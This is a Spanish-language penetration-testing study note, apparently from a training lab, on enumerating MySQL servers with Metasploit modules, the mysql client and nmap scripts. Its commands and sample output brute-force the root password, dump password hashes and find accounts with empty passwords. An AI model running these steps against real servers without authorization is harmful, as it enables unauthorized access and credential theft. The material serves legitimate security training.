# Enumeración *MySQL*

*MySQL* es un sistema de gestión de bases de datos relacional desarrollado bajo licencia dual: GPL/licencia comercial basado en *SQL*. Por defecto usa el puerto 3306. Durante la enumeración podemos obtener:

- Versión.
- Listado de bases de datos, Tablas, etc.
- Usuarios y privilegios.

La enumeración de este servicio es considerablemente diferente en función de si tenemos previamente las credenciales de alguno de los usuarios o no.

## Enumeración *MySQL* con *metasploit*

El listado de módulos para la versión 6.4 de *metasploit* es el siguiente:

```bash
msf > search type:auxiliary name:mysql

Matching Modules
================

	#  Name                                               Disclosure Date  Rank    Check  Description
	-  ----                                               ---------------  ----    -----  -----------
	0  auxiliary/server/capture/mysql                     .                normal  No     Authentication Capture: MySQL
	1  auxiliary/scanner/mysql/mysql_writable_dirs        .                normal  No     MYSQL Directory Write Test
	2  auxiliary/scanner/mysql/mysql_file_enum            .                normal  No     MYSQL File/Directory Enumerator
	3  auxiliary/scanner/mysql/mysql_hashdump             .                normal  No     MYSQL Password Hashdump
	4  auxiliary/scanner/mysql/mysql_schemadump           .                normal  No     MYSQL Schema Dump
	5  auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
	6  auxiliary/admin/mysql/mysql_enum                   .                normal  No     MySQL Enumeration Module
	7  auxiliary/scanner/mysql/mysql_login                .                normal  No     MySQL Login Utility
	8  auxiliary/admin/mysql/mysql_sql                    .                normal  No     MySQL SQL Generic Query
	9  auxiliary/scanner/mysql/mysql_version              .                normal  No     MySQL Server Version Enumeration
```

### *mysql_version*

Muestra la versión de *MySQL* instalada en el servidor. Este módulo tiene pocas opciones, por lo que podemos ejecutar despues de configurar la IP y el puerto, si no fuera el puerto por defecto.

```bash
msf > use auxiliary/scanner/mysql/mysql_version
msf > run
[+] 192.101.123.3:3306 - 192.101.123.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] 192.101.123.3:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### *mysql_login*

Este módulo realiza fuerza bruta sobre las credenciales de la base de datos. Es necesario proporcionar una lista de contraseñas y un usuario o lista. Una opción interesante es usar el usuario *root* en lugar de una lista.

```bash
msf > use auxiliary/scanner/mysql/mysql_login
msf > set PASS_FILE /path/wordlist.txt
msf > set USERNAME root
msf > run
[+] 192.101.123.3:3306    - 192.101.123.3:3306 - Success: 'root:twinkle'
[*] 192.101.123.3:3306   - Scanned 1 of 1 hosts (100% complete)
[*] 192.101.123.3:3306   - Bruteforce completed, 1 credential was successful.
[*] 192.101.123.3:3306   - You can open an MySQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed

```

### *mysql_enum*

Este módulo, teniendo acceso a las credenciales de un usuario, realiza una enumeración variada del servidor como: versión del servidor, sistema operativo, información sobre ssl, nombre de la máquina, usuarios y sus privilegios, hash de sus contraseñas, etc. Esto último es muy importante porque en caso de haber obtenido acceso con un usuario sin privilegios, podemos intentar romper el hash del usuario root para tener acceso completo.

```bash
msf > use auxiliary/scanner/mysql/mysql_enum
msf > set USERNAME root
msf > set PASSWORD twinkle
msf > run
```

### *mysql_sql*

Permite ejecutar consultas *SQL* e interactuar directamente con el servidor *MySQL* a través del usuario que hemos obtenido anteriormente.

```bash
msf > use auxiliary/scanner/mysql/mysql_sql
msf > set USERNAME root
msf > set PASSWORD twinkle
msf > set SQL show databases;
msf > run
[*] Running module against 192.101.123.3

[*] 192.101.123.3:3306 - Sending statement: 'show databases;'...
[*] 192.101.123.3:3306 -  | information_schema |
[*] 192.101.123.3:3306 -  | mysql |
[*] 192.101.123.3:3306 -  | performance_schema |
[*] 192.101.123.3:3306 -  | upload |
[*] 192.101.123.3:3306 -  | vendors |
[*] 192.101.123.3:3306 -  | videos |
[*] 192.101.123.3:3306 -  | warehouse |
[*] Auxiliary module execution completed
```

## Acceso al servidor con el comando mysql

A través de  metasploit, es necesario volver a configurar la opción *SQL* para cada consulta que o para cada módulo que queramos usar. Una forma más eficiente de obtener los datos es conectarse directamente a la base de datos.

```bash
mysql -h 192.101.123.3 -u root -p
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| upload             |
| vendors            |
| videos             |
| warehouse          |
+--------------------+
7 rows in set (0.001 sec)

MySQL [(none)]> use upload;
Database changed
MySQL [upload]> show tables;
Empty set (0.000 sec)
```

Donde:
- h: indica una conexión remota al host.
- u: usario.
- p: contraseña.

## Enumeración *MySQL* con *nmap*

Como se ha dicho antes, la enumeración del servicio *MySQL* es completamente diferente si tenemos o no tenemos las credenciales de acceso. A continuación vemos algunos de los scripts más importantes en caso de no tenerlas.

Por otro lado, es recomendable ejecutar siempre el script *mysql-vuln-cve2012-2122* para comprobar si el servicio es vulnerable.

```bash
ls /usr/share/nmap/scripts | grep mysql
mysql-audit.nse
mysql-brute.nse
mysql-databases.nse
mysql-dump-hashes.nse
mysql-empty-password.nse
mysql-enum.nse
mysql-info.nse
mysql-query.nse
mysql-users.nse
mysql-variables.nse
mysql-vuln-cve2012-2122.nse
```

### mysql-empty-password

Comprueba si hay cuentas en el servidor que no tengan establecida una contraseña, para así obtener acceso anonimo.

```bash
nmap -p 3306 --script mysql-empty-password 192.112.63.3
```

### mysql-enum

Este script se usa para enumerar usuarios del servidor.

```bash
nmap -p 3306 --script mysql-enum 192.112.63.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-04 22:17 IST
Nmap scan report for demo.ine.local (192.112.63.3)
Host is up (0.000067s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
MAC Address: 02:42:C0:70:3F:03 (Unknown)

```

### mysql-info

Proporciona información básica sobre el servidor *MySQL* como: protocolo, versión o el plugin de autenticación, que puede indicarnos que tipos de ataques pueden funcionar sobre las contraseñas.

```bash
nmap -p 3306 --script mysql-info 192.112.63.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-04 22:10 IST
Nmap scan report for demo.ine.local (192.112.63.3)
Host is up (0.000042s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.61-0ubuntu0.14.04.1
|   Thread ID: 44
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Support41Auth, InteractiveClient, FoundRows, SupportsTransactions, Speaks41ProtocolOld, LongPassword, IgnoreSigpipes, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, LongColumnFlag, SupportsCompression, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: f.P)yIAG!l!]0u!AcN>,
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:C0:70:3F:03 (Unknown)
```

### mysql-brute

Realiza fuerza bruta para obtener usuarios y credenciales del servidor. Usa unas listas por defecto, aunque como a otros scripts se le pude indicar una diferente.

```bash
nmap -p 3306 --script mysql-brute 192.112.63.3
```

[⟵ Anterior](../03_activa.md#323-enummeración-de-servicios)
